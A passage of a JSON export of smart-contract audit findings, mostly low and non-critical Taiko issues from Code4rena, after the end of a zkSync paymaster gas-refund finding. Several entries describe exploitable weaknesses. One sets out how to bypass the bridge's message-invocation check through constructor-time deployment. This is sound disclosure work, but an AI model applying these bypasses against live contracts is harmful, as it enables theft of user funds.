  gasPrice, \n                    \"fdf\"\n                ) \n\n                directETHTransfer(ethToRefund, refundRecipient)\n\n                finalRefund := refundInGas\n            }\n```\n\n</details>\n\n### Assessed type\n\nContext\n\n**[saxenism (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2024-03-zksync-findings/issues/78#issuecomment-2036982976):**\n > We confirm the finding. It is good.\n> \n> We however believe that this is a medium severity issue since this is a rarely used functionality.\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2024-03-zksync-findings/issues/78#issuecomment-2082867166):**\n > The Warden has identified a discrepancy in the way paymaster refunds are processed for L2 transactions, resulting in an over-compensation that overlaps with the gas spent on public data.\n> \n> The exhibit is correct, and I am not in complete agreement with the Sponsor's assessment in relation to the submission's severity. The referenced code will trigger if a paymaster has been defined, and I do not believe there is any constraint that permits a malicious user from **always triggering the surplus refund** and thus **from slowly siphoning funds in the form of gas from the system**.\n> \n> As the flaw **is always present** and its impact **is properly considered medium**, I consider the combination of those two factors to merit a **high severity rating**.\n\n\n\n***\n\n \n",
      "summary": "\nThe bug report discusses a modification in the update where the GAS spent by `pubdata` is collected at the final step of the transaction. However, if there is a `paymaster` involved, there is an issue when executing `paymaster.postTransaction(_maxRefundedGas)`. The `_maxRefundedGas` does not subtract the `spentOnPubdata`, resulting in a larger value than the correct one. This can lead to the `paymaster` refunding the user for the `spentOnPubdata` already used. The impact of this bug is that the `paymaster` will refund the `spentOnPubdata` to the user. To mitigate this issue, the code in `bootloader.yul` needs to be modified to subtract the `spentOnPubdata` from the `paymaster's` `_maxRefundedGas` value. This bug is assessed to be of high severity as it is always present and can potentially lead to a slow siphoning of funds from the system.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "https://github.com/code-423n4/2024-03-zksync-findings/issues/78",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "31977",
      "title": "[N-13] Consider making the TIMELOCK_ADMIN_ROLE undergo a delay when transferring the admin role",
      "impact": "LOW",
      "content": "\nThe admin is allowed to skip the delay in operations. But the delay should not be skipped when the role is being transferred.\n```solidity\nFile: TaikoTimelockController.sol\n25:     function getMinDelay() public view override returns (uint256) {\n26:         return hasRole(TIMELOCK_ADMIN_ROLE, msg.sender) ? 0 : super.getMinDelay();\n27:     }\n```\n**[dantaik (Taiko) confirmed commented](https://github.com/code-423n4/2024-03-taiko-findings/issues/335#issuecomment-2036565025):**\n > Many of the above are fixed in  https://github.com/taikoxyz/taiko-mono/pull/16627/files:\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31976",
      "title": "[N-12] Guardian proof that is never fully approved by minGuardians is never deleted",
      "impact": "LOW",
      "content": "\nA guardian proof hashs is only deleted if it has been approved by min number of guardians in the approval bits. In case it is not, the approval for the hash remains and is not deleted. \n```solidity\nFile: GuardianProver.sol\n50:         if (approved_) {\n51:             deleteApproval(hash);\n52:             ITaikoL1(resolve(\"taiko\", false)).proveBlock(_meta.id, abi.encode(_meta, _tran, _proof));\n53:         }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31975",
      "title": "[N-11] Consider reading return value from snapshot() function",
      "impact": "LOW",
      "content": "\n[Link](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/TaikoToken.sol#L52)\n\nThe snapshot() function returns a uint256 snapshotId. These ids if retrieved earlier can make the devs life easier when taking multiple timely snapshots.\n```solidity\nFile: TaikoToken.sol\n54:     function snapshot() public onlyFromOwnerOrNamed(\"snapshooter\") {\n55:         _snapshot();\n56:     }\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31974",
      "title": "[N-10] MerkleClaimable does not check if claimStart is less than claimEnd",
      "impact": "LOW",
      "content": "\n```solidity\nFile: MerkleClaimable.sol\n90:     function _setConfig(uint64 _claimStart, uint64 _claimEnd, bytes32 _merkleRoot) private {\n91:         \n92:         claimStart = _claimStart;\n93:         claimEnd = _claimEnd;\n94:         merkleRoot = _merkleRoot;\n95:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31973",
      "title": "[N-09] srcToken and srcChainId is not updated on old token after migration through changeBridgedToken()",
      "impact": "LOW",
      "content": "\n[Link](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/tokenvault/BridgedERC20.sol#L73)\n\nWhen a token is migrated to another token, the old token still points towards the same srcToken and srcChainId as the new token since they are not updated through changeBridgedToken(). \n\nDue to this external dapps integrating and using these values as reference could run into potential issues. Consider clearing them or changing them to some placeholder data representing the src token and chainId but with a prefix. \n```solidity\nFile: BridgedERC20.sol\n123:     function canonical() public view returns (address, uint256) {\n124:         return (srcToken, srcChainId);\n125:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31972",
      "title": "[N-08] Missing address(0) check for USDC in USDCAdapter",
      "impact": "LOW",
      "content": "\n[Link](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/tokenvault/adapters/USDCAdapter.sol#L38)\n\nIt is important to implement this check in init() functions since they can only be called once.\n\n```solidity\nFile: USDCAdapter.sol\n38:     function init(address _owner, address _addressManager, IUSDC _usdc) external initializer {\n39:         __Essential_init(_owner, _addressManager);\n40:        \n41:         usdc = _usdc;\n42:     }\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31971",
      "title": "[N-07] Incorrect natspec comment for proveMessageReceived()",
      "impact": "LOW",
      "content": "\nCorrect first comment on Line 394 to \"msgHash has been received\"\n```solidity\nFile: Bridge.sol\n394:     /// @notice Checks if a msgHash has failed on its destination chain. \n395:     /// @param _message The message.\n396:     /// @param _proof The merkle inclusion proof.\n397:     /// @return true if the message has failed, false otherwise.\n398:     function proveMessageReceived(\n399:         Message calldata _message,\n400:         bytes calldata _proof\n401:     ) public view returns (bool) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31970",
      "title": "[N-06] Use require instead of assert",
      "impact": "LOW",
      "content": "\nUse require instead of assert to avoid Panic error, see solidity docs [here](https://docs.soliditylang.org/en/v0.8.25/control-structures.html#panic-via-assert-and-error-via-require).\n```solidity\nFile: Bridge.sol\n503:     function _invokeMessageCall(\n504:         Message calldata _message,\n505:         bytes32 _msgHash,\n506:         uint256 _gasLimit\n507:     ) private returns (bool success_) {\n508:         if (_gasLimit == 0) revert B_INVALID_GAS_LIMIT();\n509:         assert(_message.from != address(this)); \n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31969",
      "title": "[N-05] Incorrect comment regarding gasLimit in processMessage()",
      "impact": "LOW",
      "content": "\nAs confirmed with the sponsor, the comment above the gasLimit variable should be inversed i.e. use gasLeft is called by owner, else gasLimit\n```solidity\nFile: Bridge.sol\n307:             } else {\n308:                 // Use the specified message gas limit if called by the owner, else\n309:                 // use remaining gas\n310:             \n311:                 uint256 gasLimit = msg.sender == _message.destOwner\n312:                     ? gasleft()\n313:                     : _message.gasLimit;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31968",
      "title": "[N-04] Typo in comment in Bytes.sol",
      "impact": "LOW",
      "content": "\nUse rather instead of rathern.\n```solidity\nFile: Bytes.sol\n93:     /// @notice Slices a byte array with a given starting index up to the end of the original byte\n94:     ///         array. Returns a new array rathern than a pointer to the original.\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31967",
      "title": "[N-03] Using unchecked arithmetic in for loops is handled by solc compiler 0.8.22 onwards",
      "impact": "LOW",
      "content": "\n```solidity\nFile: MerkleTrie.sol\n205:     function _parseProof(bytes[] memory _proof) private pure returns (TrieNode[] memory proof_) {\n206:         uint256 length = _proof.length;\n207:         proof_ = new TrieNode[](length);\n208:         for (uint256 i = 0; i < length;) {\n209:             proof_[i] = TrieNode({ encoded: _proof[i], decoded: RLPReader.readList(_proof[i]) });\n210:             \n211:             unchecked {\n212:                 ++i;\n213:             }\n214:         }\n215:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31966",
      "title": "[N-02] Missing source()/canonical() function on BridgedERC115 contract",
      "impact": "LOW",
      "content": "\n[Link](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/tokenvault/BridgedERC1155.sol#L52)\n\nThe BridgedERC1155 contract should implement a similar function to source()/canonical() as done in the other two vaults. This would better for external dapps to retrieve the data much easily.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31965",
      "title": "[N-01] Avoid hardcoding data in BridgedERC1155",
      "impact": "LOW",
      "content": "\n[Link](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/tokenvault/BridgedERC1155.sol#L52)\n\nInstead of hardcoding the data, place it in a constant variable and assign the variables here for better maintainability.\n```solidity\nFile: BridgedERC1155.sol\n53:         LibBridgedToken.validateInputs(_srcToken, _srcChainId, \"foo\", \"foo\");\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31964",
      "title": "[R-03] Use named imports to improve readability of the code and avoid polluting the global namespace",
      "impact": "LOW",
      "content": "\n```solidity\nFile: LibAddress.sol\n4: import \"@openzeppelin/contracts/utils/Address.sol\";\n5: import \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n6: import \"@openzeppelin/contracts/utils/introspection/IERC165.sol\";\n7: import \"@openzeppelin/contracts/interfaces/IERC1271.sol\";\n8: import \"../thirdparty/nomad-xyz/ExcessivelySafeCall.sol\";\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31963",
      "title": "[R-02] Instead of passing an empty string for the data parameter in NFT vaults on token transfers, allow users to supply data",
      "impact": "LOW",
      "content": "\nAllow users to supply the data parameter when transferring tokens from vault to them to ensure any off-chain compatibility/functionality can be built. \n```solidity\nFile: ERC1155Vault.sol\n227:     function _transferTokens(\n228:         CanonicalNFT memory ctoken,\n229:         address to,\n230:         uint256[] memory tokenIds,\n231:         uint256[] memory amounts\n232:     ) private returns (address token) {\n233:         if (ctoken.chainId == block.chainid) {\n234:             // Token lives on this chain\n235:             token = ctoken.addr;\n236:             \n237:             IERC1155(token).safeBatchTransferFrom(\n238:                 address(this),\n239:                 to,\n240:                 tokenIds,\n241:                 amounts,\n242:                 \"\"\n243:             );\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31962",
      "title": "[R-01] Consider implementing changeBridgedToken() and btokenBlacklist for ERC721Vault and ERC1155Vault",
      "impact": "LOW",
      "content": "\n[Link](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/tokenvault/ERC1155Vault.sol#L29)\n\nBoth vaults are currently missing these two functions. Implementing them is not required but it would be good as a safety net for high-valued NFT collections in emergency scenarios that could arise.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31961",
      "title": "[L-14] One-off error when evaluating deposits to process with the ring buffer size",
      "impact": "LOW",
      "content": "\n[Link](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/libs/LibDepositing.sol#L141)\n\nWhen calculating the deposits to process, we do not want to overwrite existing slots. This is why the last check/condition is implemented.\n\nThe issue with the condition is that it is one-off by the max size the ring bugger allows. Since + 1 is already added, make the check < into <= to work to it's full capacity. \n```solidity\nFile: LibDepositing.sol\n148:         unchecked {\n149:              \n150:             return\n151:                 _amount >= _config.ethDepositMinAmount &&\n152:                 _amount <= _config.ethDepositMaxAmount &&\n153:                 _state.slotA.numEthDeposits -\n154:                     _state.slotA.nextEthDepositToProcess <\n155:                 _config.ethDepositRingBufferSize - 1;   \n156:         }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31960",
      "title": "[L-13] One off error in block sync threshold check to sync chain data",
      "impact": "LOW",
      "content": "\nThe check should be _l1BlockId >= lastSyncedBlock + BLOCK_SYNC_THRESHOLD since threshold is the minimum threshold. \n```solidity\nFile: TaikoL2.sol\n150:         if (_l1BlockId > lastSyncedBlock + BLOCK_SYNC_THRESHOLD) {\n151:             // Store the L1's state root as a signal to the local signal service to\n152:             // allow for multi-hop bridging.\n153:             ISignalService(resolve(\"signal_service\", false)).syncChainData(\n154:                 ownerChainId,\n155:                 LibSignals.STATE_ROOT,\n156:                 _l1BlockId,\n157:                 _l1StateRoot\n158:             );\n```\n\nSame issue here:\n```solidity\nFile: LibVerifying.sol\n240:         if (_lastVerifiedBlockId > lastSyncedBlock + _config.blockSyncThreshold) {\n241:             signalService.syncChainData(\n242:                 _config.chainId, LibSignals.STATE_ROOT, _lastVerifiedBlockId, _stateRoot\n243:             );\n244:         }\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31959",
      "title": "[L-12] Consider reading return value from snapshot() function",
      "impact": "LOW",
      "content": "\n[Link](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/L1/TaikoToken.sol#L52)\n\nThe snapshot() function returns a uint256 snapshotId. These ids if retrieved earlier can make the devs life easier when taking multiple timely snapshots.\n```solidity\nFile: TaikoToken.sol\n54:     function snapshot() public onlyFromOwnerOrNamed(\"snapshooter\") {\n55:         _snapshot();\n56:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31958",
      "title": "[L-11] onMessageInvocation checks in _invokeMessageCall() can be bypassed to call arbitrary function from Bridge contract",
      "impact": "LOW",
      "content": "\n[Link](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/bridge/Bridge.sol#L490)\n\nThe if block requires the data to be greater than equal to 4 bytes, equal to the onMessageInvocation selector and last but not the least for the target address to be a contract.\n\nWhat an attacker could do to bypass this expected spec is to pre-compute an address for the destination chain and pass it in `_message.to`. He can pass gasLimit = 0 from source to only allow him to process the message on the destination. \n\nOn the destination chain, the attacker can deploy his pre-computed contract address and call processMessage() with it from the constructor. For a chain (L2s/L3s) with no invocation delays, the proving + executing of the message data would go through in one single call.\n\nWhen we arrive at the isContract check below on the `_message.to` address, we evaluate to false since the size of the contract during construction is 0. Due to this, the attacker can validly bypass the onMessageInvocation selector that is a requirement/single source of tx origination by the protocol for all transactions occurring from the bridge contract. This breaks a core invariant of the protocol.\n```solidity\nFile: Bridge.sol\n513:         if (\n514:             _message.data.length >= 4 && // msg can be empty\n515:             bytes4(_message.data) !=\n516:             IMessageInvocable.onMessageInvocation.selector &&\n517:             _message.to.isContract()\n518:         ) {\n519:             success_ = false; \n520:         } else {\n521:             (success_, ) = ExcessivelySafeCall.excessivelySafeCall(\n522:                 _message.to,\n523:                 _gasLimit,\n524:                 _message.value,\n525:                 64, // return max 64 bytes\n526:                 _message.data\n527:             );\n528:         }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31957",
      "title": "[L-10] User loses all Ether if their address is blacklisted on canonical token",
      "impact": "LOW",
      "content": "\nWhen recalls are made on the source chain using the function recallMessage(), it calls the onMessageRecalled() function on the ERC20Vault contract. The onMessageRecalled() function transfers the ERC20 tokens back to the user along with any Ether that was supplied.\n\nThe issue is with this dual transfer where both ERC20 tokens are Ether are transferred to the user in the same call. If the user is blacklisted on the canonical token, the whole call reverts, causing the Ether to be stuck in the Bridge contract.\n\nTo understand this, let's consider a simple example:\n1. User bridges ERC20 canonical tokens and Ether from chain A to chain B.\n2. The message call on the destination chain B goes into RETRIABLE status if it fails for the first time. (**Note: User can only process after invocation delay**).\n3. On multiple retries after a while, the user decides to make a last attempt, on which the call fails and goes into FAILED status. \n4. During this time on chain B, the user was blacklisted on the ERC20 canonical token on the source chain.\n4. When the failure signal is received by the source chain A from chain B, the user calls recallMessage() on chain A only to find out that although the blacklist is only for the canonical ERC20 token, the Ether is stuck as well. \n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31956",
      "title": "[L-09] If a message is suspended before processMessage() is called, the ERC20 tokens on the source chain and Ether are not refunded.",
      "impact": "LOW",
      "content": "\nIf a message is suspended before processMessage() is called, the status of the message remains new and the ERC20 tokens on the source and the Ether is locked as well. If the message will never be unsuspended, consider refunding the tokens to the user.\n```solidity\nFile: Bridge.sol\n287:         if (block.timestamp >= invocationDelay + receivedAt) {\n288:             // If the gas limit is set to zero, only the owner can process the message.\n289:             if (_message.gasLimit == 0 && msg.sender != _message.destOwner) {\n290:                 revert B_PERMISSION_DENIED();\n291:             }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31955",
      "title": "[L-08] Protocol does not refund extra ETH but implements strict check",
      "impact": "LOW",
      "content": "\n[See spec here](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/bridge/IBridge.sol#L105)\n\nThe IBridge.sol contract specifies that extra ETH provided when sending a message is refunded back to the user. This currently does not happen since the code implements strict equality check. Using strict equality is better but pointing out the spec described, which would either be followed in the code implemented or the spec should be described properly in the IBridge.sol contract.\n\n```solidity\nFile: Bridge.sol\n146:         uint256 expectedAmount = _message.value + _message.fee;\n147:         if (expectedAmount != msg.value) revert B_INVALID_VALUE();\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31954",
      "title": "[L-07] sendMessage() does not check if STATUS is equal to NEW",
      "impact": "LOW",
      "content": "\n[Link](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/bridge/Bridge.sol#L115)\n\nAdding a sanity check would be good to avoid being able to call message that is not in the STATUS = NEW state. This would ensure retriable, recalls and failed txns cannot be repeated again.\n```solidity\nFile: Bridge.sol\n119:     function sendMessage(\n120:         Message calldata _message\n121:     )\n122:         external\n123:         payable\n124:         override\n125:         nonReentrant\n126:         whenNotPaused\n127:         returns (bytes32 msgHash_, Message memory message_)\n128:     {\n129:         // Ensure the message owner is not null.\n130:         if (\n131:             _message.srcOwner == address(0) || _message.destOwner == address(0)\n132:         ) {\n133:             revert B_INVALID_USER();\n134:         }\n135: \n136:         // Check if the destination chain is enabled.\n137:         (bool destChainEnabled, ) = isDestChainEnabled(_message.destChainId);\n138: \n139:         // Verify destination chain and to address.\n140:         if (!destChainEnabled) revert B_INVALID_CHAINID();\n141:         if (_message.destChainId == block.chainid) {\n142:             revert B_INVALID_CHAINID();\n143:         }\n144: \n145:         // Ensure the sent value matches the expected amount.\n146:         \n148:         uint256 expectedAmount = _message.value + _message.fee;\n149:         if (expectedAmount != msg.value) revert B_INVALID_VALUE();\n150: \n151:         message_ = _message;\n152: \n153:         // Configure message details and send signal to indicate message sending.\n154:         message_.id = nextMessageId++;\n155:         message_.from = msg.sender; \n156:         message_.srcChainId = uint64(block.chainid);\n157: \n158:         msgHash_ = hashMessage(message_);\n159: \n160:         ISignalService(resolve(\"signal_service\", false)).sendSignal(msgHash_);\n161:         emit MessageSent(msgHash_, message_);\n162:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31953",
      "title": "[L-06] Bridge integration issues with swapping protocols",
      "impact": "LOW",
      "content": "\nCross-chain swapping could not occur on chains having long invocation delays since deadline of the swap might expire and become outdated. Consider having custom delays for dapps looking to use bridge. \n\n```solidity\nFile: Bridge.sol\n459:     /// the transactor is not the preferredExecutor who proved this message.\n460:     function getInvocationDelays()\n461:         public\n462:         view\n463:         virtual\n464:         returns (uint256 invocationDelay_, uint256 invocationExtraDelay_)\n465:     {\n466:         if (\n467:             block.chainid == 1 // Ethereum mainnet\n468:         ) {\n469:             // For Taiko mainnet\n470:             // 384 seconds = 6.4 minutes = one ethereum epoch\n471:             return (1 hours, 384 seconds);\n472:         } else if (\n473:             block.chainid == 2 || // Ropsten\n474:             block.chainid == 4 || // Rinkeby\n475:             block.chainid == 5 || // Goerli\n476:             block.chainid == 42 || // Kovan\n477:             block.chainid == 17_000 || // Holesky\n478:             block.chainid == 11_155_111 // Sepolia\n479:         ) {\n480:             // For all Taiko public testnets\n481:             return (30 minutes, 384 seconds);\n482:         } else if (block.chainid >= 32_300 && block.chainid <= 32_400) {\n483:             // For all Taiko internal devnets\n484:             return (5 minutes, 384 seconds);\n485:         } else {\n486:             // This is a Taiko L2 chain where no deleys are applied.\n487:             return (0, 0);\n488:         }\n489:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31952",
      "title": "[L-05] Add \"Zero if owner will process themself\" comment to gasLimit instead of fee",
      "impact": "LOW",
      "content": "\nIn the current code, the preferredExecutor for executing bridged transactions is determined by whether the gasLimit is 0 or not and not the fee.\n```solidity\nFile: IBridge.sol\n38:         // Processing fee for the relayer. Zero if owner will process themself. \n39:         uint256 fee;\n40:         // gasLimit to invoke on the destination chain.\n41:         uint256 gasLimit;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31951",
      "title": "[L-04] sendSignal() calls can be spammed by attacker to relayer",
      "impact": "LOW",
      "content": "\n[Link](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/signal/SignalService.sol#L63)\n\nSince the function is external, an attacker can continuously spam signals to the offchain relayer which is always listening to signals. This would be more cost efficient on Taiko where fees are cheap.\n\nThe signals could also be used to mess with the relayer service i.e. by sending a the same signal early by frontrunning a user's bytes32 signal _parameter.\n```solidity\nFile: SignalService.sol\n68:     function sendSignal(bytes32 _signal) external returns (bytes32) {\n69:         return _sendSignal(msg.sender, _signal, _signal);\n70:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31950",
      "title": "[L-03] If amountUnlocked in TimelockTokenPool is less than 1e18, rounding down occurs",
      "impact": "LOW",
      "content": "\n[Link](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/team/TimelockTokenPool.sol#L197)\n\nIf amountUnlocked is less than 1e18, round down occurs. This is not a problem since grants will usually be dealing with way higher values and thus higher unlocking. But this would be a problem for team members or advisors getting maybe 10 taiko or less (in case price of taiko is high). So the more frequent the withdrawing there might be chances of losing tokens due to round down.\n```solidity\nFile: TimelockTokenPool.sol\n198:         uint128 _amountUnlocked = amountUnlocked / 1e18; // divide first\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31949",
      "title": "[L-02]  __ERC1155Receiver_init() not initialized in ERC1155Vault",
      "impact": "LOW",
      "content": "\n[Link](https://github.com/code-423n4/2024-03-taiko/blob/f58384f44dbf4c6535264a472322322705133b11/packages/protocol/contracts/tokenvault/ERC1155Vault.sol#L29)\n\nConsider initializing these functions in an init() function in the ERC1155Vault contract.\n```solidity\nFile: ERC1155ReceiverUpgradeable.sol\n14:     function __ERC1155Receiver_init() internal onlyInitializing {\n15:     }\n16: \n17:     function __ERC1155Receiver_init_unchained() internal onlyInitializing {\n18:     }\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Taiko",
      "source_link": "https://code4rena.com/reports/2024-03-taiko",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "31948",
      "title": "[L-01] Consider initializing ContextUpgradeable contract by calling __Context_init() in TaikoToken.sol",
      "impact": "LOW",
